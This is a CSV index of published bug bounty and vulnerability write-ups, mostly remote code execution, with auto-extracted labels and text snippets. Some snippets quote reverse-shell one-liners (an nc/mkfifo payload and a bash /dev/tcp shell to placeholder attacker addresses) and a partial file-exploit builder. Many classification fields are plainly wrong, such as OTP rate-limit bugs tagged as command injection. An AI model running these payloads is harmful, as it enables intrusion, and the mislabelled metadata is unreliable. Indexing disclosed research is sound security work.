Title,URL,Authors,Programs,Bugs,Bounty,PublicationDate,AddedDate,functionality,vulnerability_type,execution_context,attack_vector,language_or_framework,impact,technical_details
Inside Xerox WorkCentre: Two Unauthenticated RCEs,https://swarm.ptsecurity.com/inside-xerox-workcentre-two-unauthenticated-rces/,Arseniy Sharoglazov (@_mohemiv),Xerox,"RCE, Local Privilege Escalation, Printer hacking, Security code review",0,6/28/24,7/1/24,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Zero click vulnerability in Apple’s macOS Mail,https://mikko-kenttala.medium.com/zero-click-vulnerability-in-apples-macos-mail-59e0c14b106c,Mikko Kenttälä (@Turmio_),Apple,"Account takeover, Information disclosure, RCE",0,4/1/21,9/15/22,File Management,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
OTP brute-force via rate limit bypass,https://bilalabdulmuqeet.medium.com/brute-forcing-otp-via-bypassing-rate-limit-c5ee6b25c2a8,Bilal Muqeet (@blmqt),-,"Bruteforce, Lack of rate limiting, OTP bypass",0,3/21/21,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,"set, indicating the successful OTP brute-force attempt, with the absence of a rate limit:Hope you enjoyed reading till here, Cheers!Regards,Bilal Abdul Muqeet.P.S: For those asking about the bounty amount, it was a 4 digit plus.Bug BountyEthical HackingCybersecurityInformation SecurityBug Bounty Tips----3FollowPublished in System Weakness7.4K followers·Last published 16 hours agoSystem Weakness is"
TikTok for Android 1-Click RCE,https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105,Sayed Abdelhafiz (@dPhoeniixx),TikTok,"RCE, XSS, Insecure intent, Android",0,3/18/21,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
CVE-2021-27076: A Replay-style Deserialization Attack Against Sharepoint,https://www.thezdi.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint,Simon Zuckerbraun (@HexKitchen),Microsoft,"Insecure deserialization, RCE",0,3/17/21,9/15/22,Imports/Sharing,Insecure Deserialization,Desktop App RCE,Web Application Parameter,.NET,Shell/Command Execution,Payload not explicitly detailed
Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws,https://memorycorruption.net/posts/rce-lua-factorio/,Memory Corruption,Factorio,"RCE, Memory corruption",0,6/29/24,7/8/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,will leverage weaknesses in the Lua implementation to craft fake objects These fake objects will allow us to leak/corrupt memory to alter the behaviour of the program We follow one of the many techniques to gain code execution by leveraging these powerful primitives
“How Companies Need to Widen There Scopes”,https://medium.com/@amnotacat/how-companies-need-to-widen-there-scopes-75ba19ac50c7,amnotacat,-,"RCE, Components with known vulnerabilities",0,8/25/21,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
"All Your (d)Base Are Belong To Us, Part 1: Code Execution in Apache OpenOffice (CVE-2021–33035)",https://medium.com/csg-govtech/all-your-d-base-are-belong-to-us-part-1-code-execution-in-apache-openoffice-cve-2021-33035-767fc7d6daf7,Eugene Lim (@spaceraccoonsec),Apache,"RCE, Memory corruption",0,9/17/21,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Full System Compromise,"= b’\x03' # dbase version number payload += b’\x01\x01\x01' # last update date payload += pack(‘<i’, 1) # number of records payload += pack(‘<h’, 65) # number of records payload += pack(‘<h’, 4095) # length of each record payload += 20 * b’\x00' # reserved bytes  # field definition payload += pack(‘11s’, b’EXPLOIT’) # field name payload += b’2' # field type (short integer) payload += 4 * b’\x00' #"
Bug Bounty: “My Remote Code Execution”,https://0xjin.medium.com/bug-bounty-my-remote-code-execution-da7bbd00925a,0xJin (@0xJin),-,"Default credentials, RCE",0,8/29/21,9/15/22,General Application Logic,Command Injection,Server-side RCE,File Upload Feature,PHP,Shell/Command Execution,"with my IP and PORT, my payload was: COPY cmd_exec FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [$MyIp] [$MyPort]>/tmp/f’;And i WAS IN! Got localhost! But i was default user “postgres” .I notice with “uname -a” that the kernel was vulnerable with a local privilege escalation exploit.And i notice i can escape from postgres because runs under root.So i could get root!Thanks gu"
CVE-2022-22947: SpEL Casting And Evil Beans,https://web.archive.org/web/20221128044142/https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/,Wyatt Dahlenburg (@wdahlenb),-,"RCE, Java Beans",0,2/26/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"I could then step through a very similar chain to what CodeQL displayed. I sent this over to VMware, who currently manages the security for Pivotal (Spring) products, on 1/15/22. They let me know they received my report pretty quickly after. Approximately a month later on 2/8/22 I heard back. They had created their own class that mostly implemented the SimpleEvaluationContext. “Someone Put Beans I"
Basic recon to RCE II,https://www.jomar.fr/posts/2022/basic_recon_to_rce_ii/,Joshua Martinelle (@J0_mart),-,RCE,0,3/22/22,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
iTop – Template Injection inside customer Portal,https://markus-krell.de/itop-template-injection-inside-customer-portal/,Markus Krell (@MarkusKrell),Combodo (iTop),"SSTI, RCE",0,3/21/22,10/24/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
From XSS to RCE (dompdf 0day),https://positive.security/blog/dompdf-rce,Positive Security (@positive_sec),-,"XSS, RCE",0,3/16/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Full System Compromise,Payload not explicitly detailed
"Git honours embedded bare repos, and exploitation via core.fsmonitor in a directory's .git/config affects IDEs, shell prompts and Git pillagers",https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md,Justin Steven (@justinsteven),"GitHub, Microsoft, JetBrains",RCE,0,3/16/22,9/15/22,Admin/Config Panel,Command Injection,CI/CD Pipeline RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
Hello: I’m your Domain Admin and I want to authenticate against you,https://decoder.cloud/2024/04/24/hello-im-your-domain-admin-and-i-want-to-authenticate-against-you/,ap (@decoder_it),Microsoft,"RCE, Privilege escalation, Authentication coercion, Active Directory, NTLM, Internal pentest",0,4/24/24,5/11/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
How I bypassed disable_functions in php to get a remote shell,https://melotover.medium.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979,Asem Eleraky (@melotover),-,RCE,0,3/13/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Third-party Library,PHP,Shell/Command Execution,"and the directory you control and it will provide you with the final PHP code to include in the theme files.This tool is based on using the mail() function, so we can easily edit the source code and change mail() to mb_send_mail().Save the edited file, and we can use a simple reverse shell payload likebash -c 'sh -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'Now we can run the tool and the result will"
SSD Advisory – NETGEAR DGND3700v2 PreAuth Root Access,https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/,-,Netgear,"Authentication bypass, OS command injection, RCE",0,3/9/22,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Oracle Access Manager Pre-Auth RCE (CVE-2021–35587 Analysis),https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316,"Nguyễn Tiến Giang (@testanull), peterjson (@peterjson)",Oracle,RCE,0,3/9/22,9/15/22,Admin/Config Panel,Insecure Deserialization,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
Pwning a Server using Markdown,https://blog.dixitaditya.com/pwning-a-server-using-markdown,Aditya Dixit (@zombie007o),Hashnode,"LFI, RCE",0,2/28/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,"--- title: ""Why I use Hashnode"" date: ""2020-02-20T22:37:25.509Z"" slug: ""why-i-use-hashnode"" image: ""Insert Image URL Here"" ---"
BrokenPrint: A Netgear stack overflow,https://research.nccgroup.com/2022/02/28/brokenprint-a-netgear-stack-overflow/,"Alex Plaskett (@alexjplaskett), Cedric Halbronn (@saidelike), Aaron Adams (@fidgetingbits)",Netgear,"Memory corruption, RCE",0,2/28/22,9/15/22,User Profile/Content,Command Injection,Server-side RCE,Web Application Parameter,Java,Full System Compromise,Payload not explicitly detailed
Catching bugs in VMware: Carbon Black Cloud Workload Appliance and vRealize Operations Manager,https://swarm.ptsecurity.com/catching-bugs-in-vmware-carbon-black-cloud-workload-appliance-and-vrealize-operations-manager/,Egor Dimitrenko (@elk0kc),VMware,"Authentication bypass, RCE, SSRF, Path traversal",0,2/25/22,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Pwn2Own Austin 2021 : Defeating The Netgear R6700V3,https://www.synacktiv.com/publications/pwn2own-austin-2021-defeating-the-netgear-r6700v3.html,"Antide Petit (@xarkes_), Mitsurugi Heishiro (@0xmitsurugi)",Netgear,"RCE, Memory corruption",0,3/25/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,"Bruteforcing heap addresses works, but it is slow due to internal timers in the circled binary (3 or 4 seconds between each try). In order to fasten up the attack, we chose to parse the heap with a step of 256 bytes and use a specific payload before the shell script. This payload is made of 260 ‘a’ and a semicolon ‘;’, followed by the commands. If $R0 points anywhere in the long ‘aaa’ part, we end"
CVE-2021-45467: CWP CentOS Web Panel – preauth RCE,https://octagon.net/blog/2022/01/22/cve-2021-45467-cwp-centos-web-panel-preauth-rce/,Paulos Yibelo (@PaulosYibelo),Centos Web Panel (CWP),"RCE, LFI, Arbitrary file write",0,1/22/22,3/2/23,File Management,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,to add malicious API key Use API key to write to a file (CVE-2021-45466)Use step #1 to include the file we just wrote into (CVE-2021-45467)Woot!  We will release a full PoC for red teams that achieves preauth RCE once enough servers migrate to the latest version.
Write Up – Android Application Screen Lock Bypass Via ADB Brute Forcing,https://omespino.com/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/,Omar Espino (@omespino),-,"Android, Bruteforce, Authentication bypass",0,2/22/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,"1.- Get the latest REDACTED Android application (X.X.X version) from Google Playstore.2.- Open the android application, login with your credentials, then navigate to: menu > settings > lockscreen  and set the passcode (in my case I set 5555 as passcode)"
Advisory: Cisco RV340 Dual WAN Gigabit VPN Router (RCE over LAN),https://www.iot-inspector.com/blog/advisory-cisco-rv340-dual-wan-gigabit-vpn-router-rce-over-lan/,Quentin Kaiser (@QKaiser),Cisco,"RCE, Unrestricted file upload, OS command injection",0,2/17/22,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Hunting for bugs in VMware: View Planner and vRealize Business for Cloud,https://swarm.ptsecurity.com/hunting-for-bugs-in-vmware-view-planner-and-vrealize-business-for-cloud/,"Mikhail Klyuchnikov (@__Mn1__), Egor Dimitrenko (@elk0kc)",VMware,RCE,0,2/15/22,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Advisory: Western Digital My Cloud Pro Series PR4100 RCE,https://www.iot-inspector.com/blog/advisory-western-digital-my-cloud-pro-series-pr4100-rce/,Quentin Kaiser (@QKaiser),Western Digital,"RCE, OS command injection",0,2/15/22,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,Payload not explicitly detailed
Code Injection to RCE with .NET,https://blog.stratumsecurity.com/2024/04/29/code-injection-to-rce-with-net/,Phil Thomas,-,"Code injection, RCE",0,4/29/24,5/8/24,Imports/Sharing,Code Injection,Server-side RCE,Web Application Parameter,NodeJS,Shell/Command Execution,"spread across multiple lines, so we needed to declare objects inline and chain the calls to Start(), StandardOutput, and ReadToEnd().Evidence from RCE and Code InjectionReflectionsTwo of the main lessons I learned from this engagement that I want to share are about the importance of Diligence and Sharing.Combing the Desert - Spaceballs (1987)Importance of DiligenceLarge web applications can be com"
WordPress < 5.8.3 - Object Injection Vulnerability,https://blog.sonarsource.com/wordpress-object-injection-vulnerability,"Simon Scannell (@scannell_simon), Karim El Ouerghemmi",WordPress,"Object injection, RCE",0,2/8/22,9/15/22,Imports/Sharing,Insecure Deserialization,CI/CD Pipeline RCE,Web Application Parameter,PHP,Full System Compromise,"becomes harmless when unserialized, as it will result in a string. As a consequence, we looked at the code that actually detects if a string is serialized in the WordPress core in hope to find a differential in the logic between the code of WordPress and the unserialize() code in the PHP core. As a reminder: here are some of the types supported by PHP’s unserialize() function: TypeExample of seria"
How I bypassed PHP functions to read sensitive files on server,https://kailashbohara.com.np/blog/2022/02/04/bypassing-PHP-functions-to-read-system-file-copy/,Kailash (@corrupted_brain),-,"Components with known vulnerabilities, RCE",0,2/4/22,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
No Rate Limiting on OTP sending,https://medium.com/@noob_master/no-rate-limiting-on-otp-sending-39a3a9fc93f6,nOOb_mAsTeR,-,"Bruteforce, Lack of rate limiting",0,2/2/22,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,type to Null payloads and started the attack. And BOOM!!!!!! It was sending OTP after every 40 seconds and spamming my phone.I reported the issue and got responses very fast within a day and got my first bounty within a month I guess. The bounty was less maybe but to me it was probably huge because it is my first ever bounty. Thank you everyone for reading the writeup.Bug BountyCybersecurity----1F
